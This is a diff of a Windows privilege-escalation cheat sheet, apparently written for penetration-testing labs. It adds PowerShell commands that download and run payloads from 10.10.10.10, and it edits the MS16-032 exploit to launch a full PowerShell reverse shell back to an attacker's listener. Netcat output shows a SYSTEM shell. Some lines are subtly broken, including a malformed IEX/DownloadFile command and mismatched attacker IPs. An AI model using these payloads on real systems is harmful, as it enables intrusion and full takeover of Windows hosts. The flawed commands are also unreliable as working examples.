@@ -10,6 +10,7 @@ net user <username>
 systeminfo
 net config Workstation 
 net users 
+
 ```
 
 ## Uploading files to the Windows machine  
@@ -83,10 +84,14 @@ Test to see if we can run Powershell Version 2:
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
 ```
 
-Try to download a file from a remote server to the windows temp folder:
+Try to download a file from a remote server to the windows temp folder from the Windows command line:
 ```
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
+```
 
+Or from a PowerShell... shell:
+```
+IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
 ```
 
 ### Uploading Files with Python
@@ -218,6 +223,25 @@ root@kali:~test/PowerShell-Suite# python -m Simple
 SimpleDialog        SimpleHTTPServer    SimpleXMLRPCServer  
 root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80
 ```
+The default version of the MS16-032 script will create a Pop-up CMD.exe window on the remote machine. Unfortunatly, we cannot access this from a limited shell... BUT we can modify the exploit to call a reverse shell.  Its pretty easy to modify it to call a reverse powershell that will connect back to our machine with a System shell.  We will need to modify line 330 of the exploit (the ip address and port will need to be updated of course):
+```powershell
+		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
+		#$CallResult = [Advapi32]::CreateProcessWithLogonW(
+		#	"user", "domain", "pass",
+		#	0x00000002, "C:\Windows\System32\cmd.exe", "",
+		#	0x00000004, $null, $GetCurrentPath,
+		#	[ref]$StartupInfo, [ref]$ProcessInfo)
+
+		# Modified to create a Powershell reverse shell 
+		$CallResult = [Advapi32]::CreateProcessWithLogonW(
+			"user", "domain", "pass",
+			0x00000002, 
+			'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 
+			'-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
+			0x00000004, $null, $GetCurrentPath,
+			[ref]$StartupInfo, [ref]$ProcessInfo)
+```
+
 On the remote host execute the exploit:
 ```cmd
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"
@@ -225,6 +249,15 @@ On the remote host execute the exploit:
 Or from a Windows Powershell:
 ```powershell
 IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')
+```
+On our Kali machine we create the reverse shell and ... BOOM! Root dance.
+```
+root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182
+
+PS C:\Users\jimmy^> whoami
+nt authority\system
 ```
 
 *Easy*
